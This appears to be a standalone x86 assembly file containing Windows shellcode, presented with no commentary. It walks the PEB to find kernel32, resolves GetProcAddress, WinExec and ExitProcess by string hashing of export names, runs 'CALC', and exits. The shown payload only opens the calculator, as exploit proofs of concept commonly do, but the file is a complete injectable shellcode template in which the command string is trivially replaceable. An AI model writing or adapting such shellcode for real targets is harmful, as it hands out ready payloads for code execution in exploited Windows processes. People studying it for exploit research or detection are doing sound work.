.intel_syntax noprefix

.section .text
    .global _start
_start:

start:
xor    ecx,ecx
mov    eax,fs:0x30
mov    eax,DWORD PTR [eax+0xc]
mov    esi,DWORD PTR [eax+0x14]
lods   eax,DWORD PTR ds:[esi]
xchg   esi,eax
lods   eax,DWORD PTR ds:[esi]
mov    ebx,DWORD PTR [eax+0x10]
mov    edx,DWORD PTR [ebx+0x3c]
add    edx,ebx
mov    edx,DWORD PTR [edx+0x78]
add    edx,ebx
mov    esi,DWORD PTR [edx+0x20]
add    esi,ebx
xor    ecx,ecx


Get_func:
inc    ecx
lods   eax,DWORD PTR ds:[esi]
add    eax,ebx
cmp    DWORD PTR [eax],0x50746547
jne    Get_func
cmp    DWORD PTR [eax+0x4],0x41636f72
jne    Get_func
cmp    DWORD PTR [eax+0x8],0x65726464
jne    Get_func
mov    esi,DWORD PTR [edx+0x24]
add    esi,ebx
mov    cx,WORD PTR [esi+ecx*2]
dec    ecx
mov    esi,DWORD PTR [edx+0x1c]
add    esi,ebx
mov    edx,DWORD PTR [esi+ecx*4]
add    edx,ebx
xor    esi,esi
push   edx
pop    esi
xor    edi,edi
push   ebx
pop    edi
xor    ecx,ecx
push   ecx
push   0x636578
push   0x456e6957
mov    ecx,esp
push   ecx
push   ebx
call   edx
xor    ecx,ecx
push   ecx
push   0x737365
push   0x636f7250
push   0x74697845
mov    ecx,esp
push   ecx
push   edi
xor    edi,edi
mov    edi,eax
call   esi
xor    esi,esi
push   eax
pop    esi
xor    ecx,ecx
push   ecx
push   0x0
push   0x434c4143
mov    ecx,esp
push   0x0
push   ecx
call   edi
push   0x0
call   esi
